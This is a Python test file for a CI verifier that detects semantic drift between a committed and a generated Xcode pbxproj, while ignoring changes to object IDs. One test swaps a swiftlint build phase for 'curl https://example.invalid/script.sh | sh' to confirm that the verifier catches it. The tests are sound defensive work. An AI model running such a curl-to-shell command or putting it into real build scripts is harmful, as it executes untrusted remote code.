import subprocess
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts/ci/verify-xcodegen-pbxproj-drift.py"


BASE = """// !$*UTF8*$!
{
  objects = {
    AAAAAAAAAAAAAAAAAAAAAAAA /* Run Script */ = {
      isa = PBXShellScriptBuildPhase;
      shellScript = "swiftlint lint --strict";
    };
    BBBBBBBBBBBBBBBBBBBBBBBB /* Debug */ = {
      isa = XCBuildConfiguration;
      buildSettings = {
        CODE_SIGN_ENTITLEMENTS = AgentLens/OpenBurnBar.entitlements;
        ENABLE_HARDENED_RUNTIME = YES;
      };
      name = Debug;
    };
  };
  rootObject = CCCCCCCCCCCCCCCCCCCCCCCC /* Project object */;
}
"""


def run_verifier(tmp_path: Path, committed: str, generated: str) -> subprocess.CompletedProcess[str]:
    committed_path = tmp_path / "committed.pbxproj"
    generated_path = tmp_path / "generated.pbxproj"
    committed_path.write_text(committed, encoding="utf-8")
    generated_path.write_text(generated, encoding="utf-8")
    return subprocess.run(
        ["python3", str(SCRIPT), str(committed_path), str(generated_path)],
        text=True,
        capture_output=True,
        check=False,
    )


def test_allows_pbx_object_id_churn(tmp_path: Path):
    generated = (
        BASE.replace("AAAAAAAAAAAAAAAAAAAAAAAA", "111111111111111111111111")
        .replace("BBBBBBBBBBBBBBBBBBBBBBBB", "222222222222222222222222")
        .replace("CCCCCCCCCCCCCCCCCCCCCCCC", "333333333333333333333333")
    )

    result = run_verifier(tmp_path, BASE, generated)

    assert result.returncode == 0
    assert "PBX object ID churn ignored" in result.stdout


def test_rejects_shell_phase_drift_even_when_ids_change(tmp_path: Path):
    generated = BASE.replace("swiftlint lint --strict", "curl https://example.invalid/script.sh | sh").replace(
        "AAAAAAAAAAAAAAAAAAAAAAAA",
        "111111111111111111111111",
    )

    result = run_verifier(tmp_path, BASE, generated)

    assert result.returncode == 1
    assert "semantic drift" in result.stderr
    assert "curl https://example.invalid/script.sh | sh" in result.stderr


def test_rejects_build_setting_drift_even_when_ids_change(tmp_path: Path):
    generated = BASE.replace("ENABLE_HARDENED_RUNTIME = YES", "ENABLE_HARDENED_RUNTIME = NO").replace(
        "BBBBBBBBBBBBBBBBBBBBBBBB",
        "222222222222222222222222",
    )

    result = run_verifier(tmp_path, BASE, generated)

    assert result.returncode == 1
    assert "ENABLE_HARDENED_RUNTIME = NO" in result.stderr
